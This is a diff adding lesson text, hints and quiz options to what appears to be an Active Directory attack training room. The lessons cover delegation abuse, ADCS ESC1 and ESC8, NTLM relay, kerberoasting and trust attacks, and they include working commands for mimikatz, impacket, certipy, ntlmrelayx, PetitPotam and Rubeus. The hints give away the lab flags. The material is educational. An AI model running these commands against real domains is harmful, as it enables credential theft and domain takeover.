@@ -4,46 +4,71 @@
   "tasks": {
     "1": {
       "title": "Kerberos delegation",
+      "body": "## Unconstrained Delegation: the TGT honeypot\n\nWhen a server has **unconstrained delegation**, any user who\nauthenticates against it leaves THEIR TGT cached in memory (LSASS). If you are admin on that\nserver, you can extract the TGTs of everyone who passed through it.\n\n```bash\n# Identify servers with unconstrained delegation\nGet-ADComputer -Filter {TrustedForDelegation -eq $true}\n\n# On the compromised server: extract tickets\nmimikatz # sekurlsa::tickets /export\n# Look for .kirbi files from privileged users\n\n# Use the stolen TGT\nmimikatz # kerberos::ptt ticket_admin@CORP.LOCAL.kirbi\n```\n\n### The full attack: PrinterBug + Unconstrained\n\n1. You find a server with unconstrained delegation where you are admin\n2. You use **PrinterBug** (`SpoolSample.exe`) to FORCE the DC to authenticate against\n   your server\n3. The DC leaves its TGT in your LSASS\n4. You extract the TGT → Pass-the-Ticket → you are the DC\n\n## Constrained Delegation: S4U2Self + S4U2Proxy\n\nConstrained delegation only lets you impersonate SPECIFIC services (SPNs).\nBut there's a bug: if you can modify the `msDS-AllowedToDelegateTo` attribute:\n\n```bash\n# With impacket (from Linux):\ngetST.py -spn cifs/dc01.corp.local -impersonate administrator corp.local/svc_account:password\n# Generates a ticket as administrator for the cifs service on dc01\n```\n\n## RBCD (Resource-Based Constrained Delegation)\n\nThe most modern one: delegation is configured ON the resource (not on the account).\nIf you can modify an object's `msDS-AllowedToActAsOther`:\n\n```bash\n# 1. Create a fake computer account\naddcomputer.py -computer-name 'EVIL$' -computer-pass 'P@ss' corp.local/user:pass\n\n# 2. Configure RBCD on the target\nrbcd.py -delegate-to dc01 -delegate-from EVIL$ -action write corp.local/user:pass\n\n# 3. Request tickets impersonating admin\ngetST.py -spn cifs/dc01.corp.local -impersonate administrator corp.local/EVIL$:P@ss\n```\n\nRBCD is especially dangerous because you only need WRITE on the\ntarget object (not Domain Admin).",
       "questions": {
         "ad-avanzado-t01-q01": {
-          "prompt": "What delegation stores all user TGTs?"
+          "prompt": "What delegation stores all user TGTs?",
+          "hint": "Unconstrained delegation — the server stores tickets in LSASS."
         },
         "ad-avanzado-t01-q02": {
-          "prompt": "What attack forces privileged authentication to steal TGTs?"
+          "prompt": "What attack forces privileged authentication to steal TGTs?",
+          "hint": "PrinterBug or PetitPotam — authentication coercion."
         },
         "ad-avanzado-t01-q03": {
-          "prompt": "What delegation only allows specific services?"
+          "prompt": "What delegation only allows specific services?",
+          "hint": "Constrained delegation (SPN-based).",
+          "options": {
+            "a": "Unconstrained (any service)",
+            "b": "Constrained (only allowed SPNs)",
+            "c": "RBCD (Resource-Based Constrained Delegation)",
+            "d": "All three are the same"
+          }
         }
       }
     },
     "2": {
       "title": "ADCS and NTLM relay",
+      "body": "## ADCS: the certificates that open the domain\n\n**ADCS** (Active Directory Certificate Services) issues digital certificates.\nIf a certificate allows Kerberos authentication and you can obtain one as another\nuser → you can impersonate them.\n\n### ESC1: enrollee supplies subject (the most common)\n\nThe certificate template lets the requester specify the **SAN** (Subject\nAlternative Name). A normal user requests a certificate with SAN=administrator@corp:\n\n```bash\n# With Certipy (Python):\ncertipy req -u user@corp.local -p password -ca CORP-CA -template VulnTemplate -upn administrator@corp.local\n\n# You get a .pfx that AUTHENTICATES as administrator\ncertipy auth -pfx administrator.pfx -dc-ip 10.10.10.10\n```\n\n### ESC8: NTLM Relay to ADCS\n\nThe ADCS web endpoint (`http://ca/certsrv`) accepts NTLM. Combined with an\nauthentication coercion:\n\n```bash\n# 1. Set up the relay (ntlmrelayx targets the ADCS web endpoint)\nntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n\n# 2. Coerce the DC to authenticate against YOUR machine (PetitPotam)\npetitpotam.py YOUR_IP dc01.corp.local\n\n# 3. ntlmrelayx gets a certificate from the DC → Pass-the-Ticket → the domain\n```\n\n## NTLM Relay: the man-in-the-middle attack\n\nNTLM has no channel binding by default → an authentication\ncan be \"relayed\" to another service:\n\n```text\nVictim (DC) ──NTLM──► Attacker (relay) ──NTLM──► Target service (LDAP/SMB/ADCS)\n```\n\n**PetitPotam** and **PrinterBug** are coercers: they force a Windows machine to\nauthenticate against an IP YOU control, kicking off the relay.\n\n## Trust attacks: from child to parent\n\nIn a multi-domain forest, an attacker in `child.corp.local` can compromise the\nparent domain `corp.local` by abusing the **trust ticket**:\n\n```bash\n# Extract the trust key from the child domain\nticketer.py -domain child.corp.local -domain-sid S-1-5-21-CHILD... -extra-sid S-1-5-21-PARENT... -spn krbtgt/corp.local child_admin\n\n# Use the ticket to access the parent domain\nexport KRB5CCNAME=child_admin.ccache && smbexec.py -k corp.local/admin@dc01.corp.local\n```\n\nThe **ExtraSid** (SID History) is the mechanism: the ticket includes the parent's\nDomain Admin SID → full access.",
       "questions": {
         "ad-avanzado-t02-q01": {
-          "prompt": "What Windows service issues Kerberos certificates?"
+          "prompt": "What Windows service issues Kerberos certificates?",
+          "hint": "Active Directory Certificate Services (ADCS)."
         },
         "ad-avanzado-t02-q02": {
-          "prompt": "What ADCS misconfig allows arbitrary SANs?"
+          "prompt": "What ADCS misconfig allows arbitrary SANs?",
+          "hint": "CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT — the user defines the Subject Alternative Name."
         },
         "ad-avanzado-t02-q03": {
-          "prompt": "What tool automates ESC8?"
+          "prompt": "What automation tool exploits ESC8 (HTTP → LDAP relay) to get a Domain Admin certificate?",
+          "hint": "Certipy or PetitPotam + ntlmrelayx.",
+          "options": {
+            "a": "Nmap",
+            "b": "Certipy (or ntlmrelayx + Certipy for the relay)",
+            "c": "sqlmap",
+            "d": "Burp Suite"
+          }
         }
       }
     },
     "3": {
       "title": "Lab: kerberoasting, ESC1 and the forest",
+      "body": "## The forest as a chainable minefield\n\nThe lab simulates corp.local with the advanced attack paths — each\nendpoint replicates the request the real tool would make:\n\n```bash\ncd labs/ad-forest-lab && cp flags.env.example flags.env\ndocker compose --env-file flags.env up -d\n# http://127.0.0.1:18116\n```\n\n### Kerberoasting (the classic that never dies)\n\n```bash\ncurl -s \"http://127.0.0.1:18116/kerberoast?spn=BACKUP\" | jq .\n```\n\nAny domain user can request a TGS for any SPN; the\nticket is encrypted with the ACCOUNT's key — if the password is weak,\nit can be cracked offline. Real-world equivalent:\n\n```powershell\nRubeus.exe kerberoast /format:hashcat\nhashcat -m 13100 hashes.txt rockyou.txt\n```\n\nThe defense: 25+ random character service passwords (or gMSA) and\nAES-only encryption.\n\n### ESC1: the certificate that makes you admin\n\n```bash\ncurl -s http://127.0.0.1:18116/adcs/templates | jq '.templates[] | select(.esc)'\ncurl -s \"http://127.0.0.1:18116/adcs/enroll?template=CorpWebServer&san=administrator@corp.local\"\n```\n\nThe `CorpWebServer` template lets the requester CHOOSE the SAN and\nDomain Users can enroll: you request a certificate whose \"identity\" is\nadministrator. With real `certipy`: `certipy req -ca CORP-CA -template\nCorpWebServer -upn administrator@corp.local` and then authenticate with that\ncertificate (pass-the-cert) without touching the admin's password.\n\n### The trusts: the side door\n\n`/trust` shows two relationships: parent-child with dev.corp.local (no\nSID filtering — exploitable via SID History) and an external\nBIDIRECTIONAL one with partner.external. In a real engagement, that second\none means \"if I compromise the partner forest, I have a way in here\" and\nvice versa. `Get-ADTrust -Filter *` and alerts on anomalous SID History\nare the routine audit for this.\n\n## Full chain of the room\n\nkerberoast (service credential) → access as svc-backup → its\ndelegation (S4U) or its right to enroll the ESC1 certificate → domain\nadmin → trust → the other forest. Advanced AD isn't a bug: it's a\nQUEUE of small delegations nobody reviewed together. Lockhart\naudits delegations, templates and trusts for exactly that reason.",
       "questions": {
         "ad-avanzado-t03-q01": {
-          "prompt": "Kerberoast the weak-password service account in the lab (/kerberoast endpoint). Submit the flag."
+          "prompt": "Kerberoast the weak-password service account in the lab (/kerberoast endpoint). Submit the flag.",
+          "hint": "curl 'http://127.0.0.1:18116/kerberoast?spn=BACKUP' — in production: Rubeus kerberoast + hashcat -m 13100"
         },
         "ad-avanzado-t03-q02": {
-          "prompt": "The lab LDAP is injectable: the (samAccountName=svc-*) filter returns what it should not. Submit the flag."
+          "prompt": "The lab LDAP is injectable: the (samAccountName=svc-*) filter returns what it should not. Submit the flag.",
+          "hint": "curl 'http://127.0.0.1:18116/ldap/query?filter=(samAccountName=svc-*)' — the filter's wildcard exposes accounts with internal notes"
         },
         "ad-avanzado-t03-q03": {
-          "prompt": "Enumerate the certificates (/adcs/templates) and abuse ESC1 by issuing a cert with SAN administrator@corp.local. Submit the flag."
+          "prompt": "Enumerate the certificates (/adcs/templates) and abuse ESC1 by issuing a cert with SAN administrator@corp.local. Submit the flag.",
+          "hint": "/adcs/enroll?template=CorpWebServer&san=administrator@corp.local — the template grants ENROLLEE_SUPPLIES_SUBJECT to Domain Users"
         },
         "ad-avanzado-t03-q04": {
-          "prompt": "Check /trust: there is a bidirectional external trust. Submit its flag."
+          "prompt": "Check /trust: there is a bidirectional external trust. Submit its flag.",
+          "hint": "curl http://127.0.0.1:18116/trust — bidirectional external trusts allow pivoting into the other forest"
         }
       }
     }
